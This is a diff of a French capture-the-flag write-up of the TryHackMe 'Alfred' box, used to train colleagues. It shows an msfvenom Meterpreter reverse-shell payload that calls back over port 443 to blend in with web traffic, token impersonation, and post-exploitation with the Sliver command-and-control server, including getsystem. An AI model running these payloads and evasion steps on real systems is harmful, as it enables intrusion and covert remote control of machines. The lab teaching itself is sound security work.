@@ -116,9 +116,10 @@ cat C:\Users\bruce\Desktop\user.txt
 ```
 
 # Reverse Shell et Switching Shell
-Sur la machine d’attaque, création de la payload est utilisé dans divers contextes techniques pour désigner les données effectives transmises dans une communication, en excluant les en-têtes, métadonnées, ou autres informations de contrôle. Nous permettant de récupérer la console meterpreter.Parler de l'obfuscation port 80/443 par rapport à un autre.
+Sur la machine d’attaque, création de la payload, la payload est utilisée dans divers contextes techniques pour désigner les données transmises dans une communication, en excluant les en-têtes, métadonnées, ou autres informations de contrôle. Nous permettant de récupérer la console meterpreter. Les ports 80/443 etant ouverts, on va pourvoir faire de l'obfuscation en passant par ceux-ci. On va venir mettre notre flux ici pour le rendre plus difficile a detecter parmit les autres interractions sur ces ports.
 
-Génération de la payload.
+Génération de la payload via l'outil **msfvenom** de la suite Metasploit permettant de générer des payloads personnalisés pour l’exploitation de vulnérabilités, souvent utilisés dans des scénarios de compromission.
+
 ```shell
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.37.61 LPORT=443 -f exe -o filouterie.exe
 ```
@@ -198,7 +199,7 @@ getuid
 ```
 
 
-*Ne marche plus depuis Windows 10 1809 & Windows Server 2019*
+⚠️ *Ne marche plus depuis Windows 10 1809 & Windows Server 2019*
 
 
 Même si on a avez un jeton de privilège supérieur, on ne disposerait peut-être pas des droits d'un utilisateur privilégié (ceci est dû à la façon dont Windows gère les autorisations - elle utilise le jeton primaire du processus et non le jeton usurpé pour déterminer ce que le processus peut ou ne peut pas faire). Il faut migrer vers un processus avec des autorisations répondant à notre besoin. Le processus correspondant est le processus services.exe. Tout d'abord, la commande ps pour afficher les processus et trouver le PID du processus services.exe 
@@ -222,9 +223,9 @@ dff0f748678f280250f25a45b8046b4a
 User
 
 # 🦧Post-Exploitation avec Sliver
-Server de commande and control explication
+Server de command & control explication
 
-Un serveur de commande et de contrôle (C&C) est un composant essentiel dans l'infrastructure des cyberattaques, notamment celles impliquant des botnets, des chevaux de Troie, des ransomwares et d'autres types de logiciels malveillants. On va pouvoir stocker les informations de machines compromises pour lancer en masses des commandes par exemple, ou venir à plusieurs attaquants sur le serveur pour effectuer plusieurs manipulations en même temps.
+Un serveur de command & de contrôle (C2) est un composant essentiel dans l'infrastructure des attaquants, notamment celles impliquant des botnets, des chevaux de Troie, des ransomwares et d'autres types de logiciels malveillants. On va pouvoir stocker les informations de machines compromises pour lancer en masses des commandes coordonnees ou non par exemple, ou venir à plusieurs attaquants sur le serveur pour effectuer plusieurs manipulations en même temps.
 
 https://github.com/BishopFox/sliver
 
@@ -283,7 +284,7 @@ Interactive
 Use id
 ```
 
-Interractions en shell windows (machine infecte)
+Pour interragir en shell sur la machine, on lance la commande shell.
 ```shell
 shell --no-pty --shell-path c:\\windows\\system32\\cmd.exe
 
@@ -294,13 +295,13 @@ getsystem
 
 Les Beacons :
 
-Bleu : Le beacon est en mode "beaconing" classique. Il fonctionne de manière discrète, en contactant périodiquement le serveur C2 selon un intervalle défini (par exemple, toutes les 60 secondes). Ce mode est conçu pour minimiser la détection, car il limite la fréquence des communications et n’exécute des commandes que lors de ses cycles programmés. On est vraiment sur de l'attaque plus discrète et automatisé.
+🔵 Bleu : Le beacon est en mode "beaconing" classique. Il fonctionne de manière discrète, en contactant périodiquement le serveur C2 selon un intervalle défini (par exemple, toutes les 60 secondes). Ce mode est conçu pour minimiser la détection, car il limite la fréquence des communications et n’exécute des commandes que lors de ses cycles programmés. On est vraiment sur de l'attaque plus discrète et automatisé.
 
-Rouge : Le beacon est en mode interactif. Cela signifie qu’une session interactive (comme un shell ou une session de commande) est ouverte avec l’implant. Dans ce mode, les commandes sont envoyées et exécutées en temps réel, ce qui permet une interaction directe avec la machine compromise. Ce mode est plus bruyant et plus susceptible d’être détecté par des solutions de sécurité, car il implique des échanges réseau plus fréquents.
+🔴 Rouge : Le beacon est en mode interactif. Cela signifie qu’une session interactive (comme un shell ou une session de commande) est ouverte avec l’implant. Dans ce mode, les commandes sont envoyées et exécutées en temps réel, ce qui permet une interaction directe avec la machine compromise. Ce mode est plus bruyant et plus susceptible d’être détecté par des solutions de sécurité, car il implique des échanges réseau plus fréquents.
 
 
 # Conclusion
 
-Ce PoC démontre qu’un simple Jenkins mal configuré peut ouvrir la voie à une compromission forte d’un système d'information. L’utilisation combinée de Metasploit et Sliver illustre bien les différentes phases d’une attaque offensive.
+Ce PoC démontre qu’un Jenkins mal sécurisé peut ouvrir la voie à une compromission critique du système. En combinant Metasploit et Sliver, nous avons exploré toutes les étapes d’une attaque offensive moderne, du simple accès jusqu’à la post-exploitation avancée.
 
-Le projet Alfredde de THM, a joué le rôle d’assistant interactif et pédagogique pour la démonstration aux collaborateurs.
+La box Alfred de THM s’est révélée être un excellent support pédagogique pour sensibiliser les collaborateurs aux risques réels d'une mauvaise configuration dans un environnement Windows.
